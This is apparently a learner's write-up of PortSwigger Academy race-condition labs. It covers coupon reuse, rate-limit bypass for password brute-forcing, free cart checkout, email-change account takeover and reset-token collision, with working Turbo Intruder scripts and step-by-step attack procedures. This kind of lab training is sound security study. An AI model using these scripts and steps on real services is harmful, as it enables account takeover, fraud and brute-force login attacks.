# Race Conditions (Labs: Portswigger Academy)

Labs from PortSwigger Academy

#### Lab 1: Limit overrun race conditions

consider an online store that lets you enter a promotional code during checkout to get a one-time discount on your order. To apply this discount, the application may perform the following high-level steps:

1. Check that you haven't already used this code.
2. Apply the discount to the order total.
3. Update the record in the database to reflect the fact that you've now used this code.

There are many variations of this kind of attack, including:

* Redeeming a gift card multiple times
* Rating a product multiple times
* Withdrawing or transferring cash in excess of your account balance
* Reusing a single CAPTCHA solution
* Bypassing an anti-brute-force rate limit

Limit overruns are a subtype of so-called "time-of-check to time-of-use" (TOCTOU) flaws. Later in this topic, we'll look at some examples of race condition vulnerabilities that don't fall into either of these categories.

```
we have coupon: PROMO20 which can be used only once.

make 10 duplicates of request POST /car/coupon
then send requests as `Send group (Parallel)`

```

In Burp Pro

```
Inside repeater tab, there is Custom Action which contains Trigger race condition
```

#### Lab 2: Bypassing rate limits via race conditions

This lab's login mechanism uses rate limiting to defend against brute-force attacks. However, this can be bypassed due to a race condition.

To solve the lab:

1. Work out how to exploit the race condition to bypass the rate limit.
2. Successfully brute-force the password for the user `carlos`.
3. Log in and access the admin panel.
4. Delete the user `carlos`.

You can log in to your account with the following credentials: `wiener:peter`. Password wordlist is provided.

```
POST /login

username=carlos&password=superman

if we try to bruteforce then we get `You have made too many incorrect login attempt. Please try again in .. seconds`

we can bypass this protection by using race condition (by grouping the request and send group parallel)
next challange is how to provide different password for different request. For this we use Turbo Intruder extension


```

we use edited version of turbo intruder script `examples/race-single-packet-attack.py` copy the wordlist

```
def queueRequests(target, wordlists):

    # if the target supports HTTP/2, use engine=Engine.BURP2 to trigger the single-packet attack
    # if they only support HTTP/1, use Engine.THREADED or Engine.BURP instead
    # for more information, check out https://portswigger.net/research/smashing-the-state-machine
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.BURP2
                           )

    # the 'gate' argument withholds part of each request until openGate is invoked
    # if you see a negative timestamp, the server responded before the request was complete
    for i in range(20):
        engine.queue(target.req, gate='race1')

    # once every 'race1' tagged request has been queued
    # invoke engine.openGate() to send them in sync
    engine.openGate('race1')


def handleResponse(req, interesting):
    table.add(req)

```

Note: make sure to set password value as `%s`

#### Lab 3: Multi-endpoint race conditions

Steps

**Predict a potential collision**

* `POST /cart`--> adds item to the cart
* `POST /cart/checkout` --> submits your order.
* The status of cart is stored based on `session ID`
  * this indicated there is potential for a collision (because) if the cart state is looked up by **one key** (session ID), then **two requests presenting the same key will operate on the same cart** — that’s a collision.
* Another key thing: Submitting and receiving confirmation of a successful order takes place over a single request/response cycle, which creates opportunity for race condition.
* Consider that there may be a race window between when your order is validated and when it is confirmed. This could enable you to add more items to the order after the server checks whether you have enough store credit.

**Attack**

* If any requests are send one by one then it takes around 700-800 milliseconds as it need to verify the cookie.
* But if we do 2 requests simultaneously then 1st request takes 700-800 milliseconds and later requests takes much smaller time.
* Therefore, we add following in one group
  * `GET /` --> to warmup
  * `POST /cart` --> to submit order of item which is costly
  * `POST /cart/checkout` --> to submit the order.
* NOTE: Make sure to add any product that we can purchase in cart. (In our case, gift card)

Then we use Repeater's `Send group (Parallel)`, here is what it does.

* `GET /` --> to warmup's the request so that other request time decreases
* `POST /cart` --> this add expensive product to the cart
* `POST /cart/checkout` --> This checkout the gift card we added.
* Since we are using Parallel request, our expensive product is added to the cart and checkout happens at same time. Hence we get the expensive product for free

How an attacker exploits it (interleaving example):

1. Attacker sends `POST /cart/checkout` → server starts validation (reads cart: only cheap item).
2. Before the server finishes commit, attacker (or another request the attacker triggers) sends `POST /cart` to add an expensive item.
3. If the server commits the order after that change but used the earlier validation result (or the commit used the now-changed cart without re-checking funds), the expensive item can be included despite insufficient funds.

#### Lab 4: Single-endpoint race conditions

This lab's email change feature contains a race condition that enables you to associate an arbitrary email address with your account.

Someone with the address `carlos@ginandjuice.shop` has a pending invite to be an administrator for the site, but they have not yet created an account. Therefore, any user who successfully claims this address will automatically inherit admin privileges.

To solve the lab:

1. Identify a race condition that lets you claim an arbitrary email address.
2. Change your email address to `carlos@ginandjuice.shop`.
3. Access the admin panel.
4. Delete the user `carlos`

You can log in to your own account with the following credentials: `wiener:peter`.

You also have access to an email client, where you can view all emails sent to `@exploit-<YOUR-EXPLOIT-SERVER-ID>.exploit-server.net` addresses.

**Attack**

The application only stores **one pending email change per account**. Submitting a new email overwrites any previous pending email, rather than queuing multiple requests. This creates a **race condition**: if multiple `POST /my-account/change-email` requests are sent in parallel with different email addresses, the database entry can be updated unpredictably while the server is generating confirmation emails.

As a result, confirmation emails may be **sent to the wrong address**, allowing an attacker to confirm an email they did not originally request. This can lead to unauthorized account access if exploited properly.

**Steps to reproduce:**

1. Send two parallel requests to change your account email — one to an email you control, one to the target’s email.
2. Observe which email receives the confirmation link; due to the race, the confirmation link may correspond to the target’s email.
3. Confirm the change using the link to gain access to the victim account (lab example: access admin panel).

Group two `POST /my-account/change-email` requests:

* In the first request, use your own valid email.
* In the second request, use `carlos@ginandjuice.shop`. Send both requests in parallel.

**Result:**

* Due to the race condition, confirmation emails may be sent to the wrong address.
* In this case, the confirmation intended for `carlos@ginandjuice.shop` is sent to your email, allowing you to confirm the change and gain admin access.

#### Lab 5: Exploiting time-sensitive vulnerabilities

This lab contains a password reset mechanism. Although it doesn't contain a race condition, you can exploit the mechanism's broken cryptography by sending carefully timed requests.

To solve the lab:

1. Identify the vulnerability in the way the website generates password reset tokens.
2. Obtain a valid password reset token for the user `carlos`.
3. Log in as `carlos`.
4. Access the admin panel and delete the user `carlos`.

You can log into your account with the following credentials: `wiener:peter`.

***

Consider a password reset token that is only randomized using a timestamp. In this case, it might be possible to trigger two password resets for two different users, which both use the same token. All you need to do is time the requests so that they generate the same timestamp.

* `POST /forgot-password` with data `username=wiener` --> sends password reset URL to wiener's mail
* if we send two request at same time `(parallel)`, we get same password reset URL . `Note: we need to use different sessionid and csrf token`
* After getting this conclusion, we change the username of 2nd request to target user `carlos`
* Then editing wiener's password URL, we can reset password of `carlos`.

#### Some Bug Bounty Reports

* [Race Condition in Flag Submission](https://hackerone.com/reports/454949) (Same Flag Multiple Points)
* [Invite members to a team](https://hackerone.com/reports/1285538) (Invite same member multiple times)
* [Bypass password attempt rate limit.](https://shahjerry33.medium.com/race-condition-eating-rate-limits-for-account-takeover-ff44b6dc8798)
* [Multiple Event Creation](https://keroayman77.medium.com/race-condition-101-how-i-exploited-a-real-bug-bounty-scenario-to-break-backend-validation-c39352815f0a)
* [Add more than 5 email at Monitor system](https://hackerone.com/reports/1913309)
* [Email mismatch](https://www.youtube.com/watch?v=Y0NVIVucQNE) Lab 4 🌟

#### Turbo Intruder Scripts

```python
def queueRequests(target, wordlists):

    # if the target supports HTTP/2, use engine=Engine.BURP2 to trigger the single-packet attack
    # if they only support HTTP/1, use Engine.THREADED or Engine.BURP instead
    # for more information, check out https://portswigger.net/research/smashing-the-state-machine
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.BURP2
                           )

    engine.queue(target.req, 'kinage7215@anysilo.com')
    time.sleep(0.5)

    engine.queue(target.req, 'kinage7215@anysilo.com', gate='race1')
    engine.queue(target.req, 'dollarboysushil@localhost.com', gate='race1')
    engine.openGate('race1')


def handleResponse(req, interesting):
    table.add(req)

```

a

```python
def queueRequests(target, wordlists):

    # as the target supports HTTP/2, use engine=Engine.BURP2 and concurrentConnections=1 for a single-packet attack
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.BURP2
                           )
    
    # assign the list of candidate passwords from your clipboard
    passwords = wordlists.clipboard
    
    # queue a login request using each password from the wordlist
    # the 'gate' argument withholds the final part of each request until engine.openGate() is invoked
    for password in passwords:
        engine.queue(target.req, password, gate='1')
    
    # once every request has been queued
    # invoke engine.openGate() to send all requests in the given gate simultaneously
    engine.openGate('1')


def handleResponse(req, interesting):
    table.add(req)
```

```python
def queueRequests(target, wordlists):

    # if the target supports HTTP/2, use engine=Engine.BURP2 to trigger the single-packet attack
    # if they only support HTTP/1, use Engine.THREADED or Engine.BURP instead
    # for more information, check out https://portswigger.net/research/smashing-the-state-machine
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.BURP2
                           )

    # the 'gate' argument withholds part of each request until openGate is invoked
    # if you see a negative timestamp, the server responded before the request was complete
    for i in range(20):
        engine.queue(target.req,'alwaysphenomenal1+test1'+str(i)+'@gmail.com', gate='race1')

    # once every 'race1' tagged request has been queued
    # invoke engine.openGate() to send them in sync
    engine.openGate('race1')


def handleResponse(req, interesting):
    table.add(req)

```
